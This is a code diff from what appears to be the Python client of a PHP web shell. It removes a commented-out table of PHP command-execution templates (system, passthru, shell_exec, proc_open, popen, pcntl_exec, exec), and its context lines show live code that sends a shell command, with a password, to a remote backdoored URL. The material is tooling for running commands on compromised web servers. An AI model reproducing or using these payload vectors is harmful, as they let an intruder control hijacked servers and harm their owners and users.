@@ -38,24 +38,7 @@ fclose($pipes[2]); proc_close($h);"""),
                     P(arg='cmd', help='Shell command', required=True, pos=0),
                     P(arg='stderr', help='Print standard error', default=True, type=bool)
                     )
-    
-    
-#    vectors = { 'shell.php' : { 
-#                               "system"       : "system('%s 2>&1');",
-#                                "passthru"     : "passthru('%s 2>&1');",
-#                                "shell_exec"   : "echo shell_exec('%s 2>&1');",
-#                                "proc_open"    : "$p = array(array('pipe', 'r'), array('pipe', 'w'), array('pipe', 'w'));" + \
-#                                                   "$h = proc_open('%s', $p, $pipes); while(!feof($pipes[1])) echo(fread($pipes[1],4096));" + \
-#                                                   "while(!feof($pipes[2])) echo(fread($pipes[2],4096)); fclose($pipes[0]); fclose($pipes[1]);" + \
-#                                                   "fclose($pipes[2]); proc_close($h);",
-#                                "popen"        : "$h = popen('%s','r'); while(!feof($h)) echo(fread($h,4096)); pclose($h);",
-#                                "python_eval"  : "python_eval('import os; os.system('%s 2>&1');",
-#                                "pcntl_exec"   : "$args = array('%s'); pcntl_exec( '%s', $args );",
-#                                "perl->system" : "$perl = new perl(); $r = @perl->system('%s 2>&1'); echo $r;",
-#                                "exec"         : "exec('%s 2>&1', $r); echo(join(\"\\n\",$r));"
-#                                
-#                               }
-#               }
+
 
     def __init__( self, modhandler , url, password):
 
